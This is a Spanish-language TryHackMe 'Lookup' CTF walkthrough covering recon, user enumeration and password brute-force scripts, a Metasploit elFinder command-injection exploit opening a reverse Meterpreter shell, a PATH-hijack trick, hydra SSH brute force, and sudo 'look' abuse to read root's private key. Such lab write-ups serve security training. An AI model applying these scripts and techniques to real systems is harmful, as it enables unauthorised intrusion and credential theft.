---
title: Lookup TryHackMe Writeup
tags: [writeup, tryhackme, ]
style: border
color: success
description: ""
---

![logo](/_posts/Lookup/GdAsgYEXcAAaKPJ.png)

## Reconocimiento
Lanzamos **nmap** a todos los puertos, con scripts y versiones de software:
```
> nmap -p- -sVC --min-rate 5000 10.10.38.250 -Pn -n -oN nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 17:24 CET
Nmap scan report for 10.10.38.250
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En la respuesta de **nmap**, vemos que hace una redirección al dominio *"lookup.thm"*, lo insertamos en nuestro fichero hosts y accedemos al sitio web.

En la dirección web, nos aguarda un formulario de autenticación:
![](/_posts/Lookup/1.png)

La primera vulnerabilidad que identificamos es la posibilidad de enumerar usuarios a través de los mensajes de error. Esto ocurre porque, al enviar un nombre de usuario inexistente, el sistema devuelve un mensaje de error diferente al que se genera cuando el usuario está registrado en la base de datos.

#### Evidencia de un usuario inexistente
![](/_posts/Lookup/2.png)

#### Evidencia de un usuario existente
![](/_posts/Lookup/3.png)

Esto nos llama la atención, por lo que el siguiente paso deberá ser la enumeración de usuarios registrados en la base de datos, para posteriormente realizar ataques automatizados de contraseñas y ganar acceso al aplicativo.

Creamos un pequeño script de **Python** para realizar la enumeración de usuarios existente:

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, re, time, sys
from random import randint

url = "http://lookup.thm/login.php"
headers_data = ''

if __name__ == '__main__':
        
        s = requests.session()

        print("[*] User bruteforce starting...")

        fp = open('/usr/share/seclists/Usernames/Names/names.txt', errors='ignore')
        for username in fp.readlines():
                r = s.get(url, verify=False)

                post_data = {
                        'username': '%s' % username.rstrip(),
                        'password': '123456'
                }

                r = s.post(url, data=post_data, headers=headers_data, verify=False)
        
                if "Wrong password." in r.text:
                        print("[+] User found!!!: %s" % username)
                
        fp.close()
```

Tras unos minutos, vemos que empezamos a enumerar varios usuarios:
```
> python3 userID.py
[*] User bruteforce starting...
[+] User found!!!: admin
[+] User found!!!: jose
```

Una vez enumerado el usuario "*Jose*", retocamos un poco el script y lo volvemos a lanzar para adivinar la contraseña por fuerza bruta:
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, re, time, sys
from random import randint

url = "http://lookup.thm/login.php"
headers_data = ''

if __name__ == '__main__':

        s = requests.session()

        print("[*] Bruteforce starting...")

        fp = open('/usr/share/wordlists/rockyou.txt', errors='ignore')
        for password in fp.readlines():
                r = s.get(url, verify=False)

                post_data = {
                        'username': 'jose',
                        'password': '%s' % password.rstrip()
                }

                r = s.post(url, data=post_data, headers=headers_data, verify=False)

                if "Wrong password." not in r.text:
                        print("[+] Password found!!!: %s" % password)

        fp.close()
```

Tras unos minutos, logramos obtener las credenciales:
```
> python3 login-bf.py
[*] Bruteforce starting...
[+] Password found!!!: **********
```

Utilizamos las credenciales, enumeramos el subdominio "*files.lookup.thm*", lo insertamos en nuestro fichero hosts y conseguiremos acceder a un servidor de ficheros con contenido bastante interesante:
![](/_posts/Lookup/4.png)

Revisamos el nombre y versión del aplicativo, enumeramos *elFinder 2.1.47*, con la idea de buscar información y vulnerabilidades sobre el software:
![](/_posts/Lookup/5.png)

Encontramos el siguiente exploit:
- [elFinder 2.1.47 - 'PHP connector' Command Injection
](https://www.exploit-db.com/exploits/46481)

## Explotación
Descargamos el exploit, lo ejecutamos y vemos que no funciona :(
```
> python2.7 46481.py http://files.lookup.thm/elFinder/
[*] Uploading the malicious image...
Traceback (most recent call last):
  File "46481.py", line 107, in <module>
    main()
  File "46481.py", line 96, in main
    hash = upload(url, payload)
  File "46481.py", line 41, in upload
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
IOError: [Errno 2] No such file or directory: 'SecSignal.jpg'
```
Enumeré la existencia de otro exploit de **Metasploit**, este último si que funcionó:
- [elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)
](https://www.exploit-db.com/exploits/46539)

```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.9.41.86:443 
[*] Uploading payload 'ZUtTxj.jpg;echo 6370202e2e2f66696c65732f5a557454786a2e6a70672a6563686f2a202e6158724c3732712e706870 |xxd -r -p |sh& #.jpg' (1931 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.aXrL72q.php) ...
[*] Sending stage (39927 bytes) to 10.10.38.250
[+] Deleted .aXrL72q.php
[*] Meterpreter session 1 opened (10.9.41.86:443 -> 10.10.38.250:51106) at 2024-11-23 19:12:16 +0100

meterpreter > shell
Process 2562 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls -lna
total 952
drwxr-xr-x 7 33 33   4096 Nov 23 18:12 .
d--x--x--x 8 33 33   4096 Apr  2  2024 ..
drwxr-xr-x 2 33 33   4096 Nov 23 18:12 .tmp
-rwxr-xr-x 1 33 33   1167 Apr  2  2024 MySQLStorage.sql
-rwxr-xr-x 1 33 33   2598 Apr  2  2024 autoload.php
-rwxr-xr-x 1 33 33   7329 Apr  2  2024 connector.minimal.php
drwxr-xr-x 5 33 33   4096 Apr  2  2024 editors
-rwxr-xr-x 1 33 33 167518 Apr  2  2024 elFinder.class.php
-rwxr-xr-x 1 33 33  12221 Apr  2  2024 elFinderConnector.class.php
-rwxr-xr-x 1 33 33  13126 Apr  2  2024 elFinderFlysystemGoogleDriveNetmount.php
-rwxr-xr-x 1 33 33   3331 Apr  2  2024 elFinderPlugin.php
-rwxr-xr-x 1 33 33   7767 Apr  2  2024 elFinderSession.php
-rwxr-xr-x 1 33 33   1094 Apr  2  2024 elFinderSessionInterface.php
-rwxr-xr-x 1 33 33  55445 Apr  2  2024 elFinderVolumeBox.class.php
-rwxr-xr-x 1 33 33 251064 Apr  2  2024 elFinderVolumeDriver.class.php
-rwxr-xr-x 1 33 33  41782 Apr  2  2024 elFinderVolumeDropbox.class.php
-rwxr-xr-x 1 33 33  44696 Apr  2  2024 elFinderVolumeDropbox2.class.php
-rwxr-xr-x 1 33 33  57466 Apr  2  2024 elFinderVolumeFTP.class.php
-rwxr-xr-x 1 33 33  68402 Apr  2  2024 elFinderVolumeGoogleDrive.class.php
-rwxr-xr-x 1 33 33   5371 Apr  2  2024 elFinderVolumeGroup.class.php
-rwxr-xr-x 1 33 33  44740 Apr  2  2024 elFinderVolumeLocalFileSystem.class.php
-rwxr-xr-x 1 33 33  28902 Apr  2  2024 elFinderVolumeMySQL.class.php
-rwxr-xr-x 1 33 33  61355 Apr  2  2024 elFinderVolumeOneDrive.class.php
-rwxr-xr-x 1 33 33   1583 Apr  2  2024 elFinderVolumeTrash.class.php
-rwxr-xr-x 1 33 33   1576 Apr  2  2024 elFinderVolumeTrashMySQL.class.php
drwxr-xr-x 2 33 33   4096 Apr  2  2024 libs
-rwxr-xr-x 1 33 33  24832 Apr  2  2024 mime.types
drwxr-xr-x 7 33 33   4096 Jul 30  2023 plugins
drwxr-xr-x 2 33 33   4096 Apr  2  2024 resources
```

Una vez dentro de la máquina, intentamos leer el fichero *user.txt* pero no tenemos acceso, también logramos enumerar la carpeta *.ssh* y un fichero oculto llamado "*.passwords*", por lo que tendremos que hacer un reconocimiento interno para elevar privilegios:
```
rwxr-xr-x 5 1000 1000 4096 Jan 11  2024 .
drwxr-xr-x 3    0    0 4096 Jun  2  2023 ..
lrwxrwxrwx 1    0    0    9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 1000 1000  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 1000 1000 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 1000 1000 4096 Jun 21  2023 .cache
drwx------ 3 1000 1000 4096 Aug  9  2023 .gnupg
-rw-r----- 1    0 1000  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 1000 1000  807 Jun  2  2023 .profile
drw-r----- 2 1000 1000 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1    0    0    9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1    0 1000   33 Jul 30  2023 user.txt
cat user.txt
cat: user.txt: Permission denied
``` 

Revisamos el fichero "*elFinderVolumeMySQL.class.php*", parece que no especifica ni el usuario ni la contraseña de MySQL
```
        $opts = array(
            'host' => 'localhost',
            'user' => '',
            'pass' => '',
            'db' => '',
            'port' => null,
            'socket' => null,
            'files_table' => 'elfinder_file',
            'tmbPath' => '',
            'tmpPath' => '',
            'rootCssClass' => 'elfinder-navbar-root-sql',
            'noSessionCache' => array('hasdirs')
```

Lanzamos el script **linpeas.sh**, vemos que enumera un binario con SGID desconocido y que podríamos utilizar para elevar privilegios:
![](/_posts/Lookup/7.png)

Probamos a ejecutar el binario y vemos que muestra un error al no encontrar el fichero "*.passwords*", este fichero lo habíamos enumerado en el usuario "*think*":
```
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
Ejecutamos el comando "*strings*" sobre el binario "*pwm*", vemos que busca el nombre del usuario entre los paréntesis al ejecutar el binario "**id**":
```
strings /usr/sbin/pwm
/lib64/ld-linux-x86-64.so.2
libc.so.6
fopen
perror
puts
__stack_chk_fail
putchar
popen
fgetc
__isoc99_fscanf
fclose
pclose
__cxa_finalize
__libc_start_main
snprintf
GLIBC_2.4
GLIBC_2.7
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
uid=%*u(%[^)])
[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
```

Creamos un script en Bash llamado *id*, en el cual insertamos de forma hardcodeada el nombre del usuario "*think*". Posteriormente, manipulamos la variable PATH para que el sistema ejecute este binario "*id*" ilegítimo en lugar del binario legítimo del sistema.

Obtenemos el id del usuario think para darle más veracidad:
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /etc/passwd | grep -i think
think:x:1000:1000:,,,:/home/think:/bin/bash
```
Generamos el falso fichero id:
```
#!/bin/env bash
echo "uid=1000(think) gid=1000(think) groups=1000(think)"

```
Modificamos el PATH y ejecutamos el binario, vemos que logramos engañarlo y obtener un listado de contraseñas del usuario "*think*":
```
export PATH=/tmp:$PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
pwm
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
<SNIP>
```

Con el listado de contraseñas, utilizamos la herramienta **hydra** para realizar un ataque de fuerza bruta sobre el servicio *SSH*, logramos obtener las credenciales correctas:
```
> hydra -l think -P passwords.txt lookup.thm ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 20:06:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: ****************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

Nos conectamos por SSH y leemos la flag de usuario:
```
> ssh think@lookup.thm
The authenticity of host 'lookup.thm (10.10.38.250)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'lookup.thm' (ED25519) to the list of known hosts.
think@lookup.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 23 Nov 2024 07:07:54 PM UTC

  System load:  0.01              Processes:             136
  Usage of /:   59.9% of 9.75GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for ens5: 10.10.38.250
  Swap usage:   0%

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 12 12:07:25 2024 from 192.168.14.1
think@lookup:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@lookup:~$ cat user.txt 
**************************
think@lookup:~$ 
```

## Escalada de privilegios
Ejecutamos el comando "*sudo -l*", vemos que podemos ejecutar un nuevo binario con permisos elevados:
```
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
think@lookup:~$ 
```
Buscamos en la web [gtfobins.github.io](https://gtfobins.github.io/), logramos identificar como podemos abusar del binario para escalar privilegios a root:
![](/_posts/Lookup/8.png)

#### Sin escalada a root

Directamente apuntamos al fichero que contiene la flag de root y ejecutamos **look** con SUDO y cargando la variable "*LFILE*", conseguimos leer la última flag:
```
think@lookup:~$ LFILE="/root/root.txt"
think@lookup:~$ sudo look '' "$LFILE"
*************************
```

#### Escalada a root
Podríamos leer el fichero "*shadow*", pero la contraseña utilizada es bastante robusta y nos costaría muchísimo tiempo intentar romper el hash, la otra alternativa más asequible, es leer la clave privada y conectarnos por *SSH* como root: 

```
think@lookup:~$ LFILE="/root/.ssh/id_rsa"
think@lookup:~$ sudo look '' "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR
j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD
<SNIP>
+Lhj8qeqwdoAsCv1IHjfVF
dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
think@lookup:~$ 
```
Generamos nuestro fichero *id_rsa*, le otorgamos permisos y nos conectamos por *SSH* sin contraseña:
```
> ssh root@lookup.thm -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 23 Nov 2024 07:20:59 PM UTC

  System load:  0.0               Processes:             137
  Usage of /:   59.9% of 9.75GB   Users logged in:       1
  Memory usage: 24%               IPv4 address for ens5: 10.10.38.250
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May 13 10:00:24 2024 from 192.168.14.1
root@lookup:~# id
uid=0(root) gid=0(root) groups=0(root)
root@lookup:~# cat root.txt
***********************
root@lookup:~# 
```

¡Hasta la próxima! ¡Que la "*suerte*" os acompañe!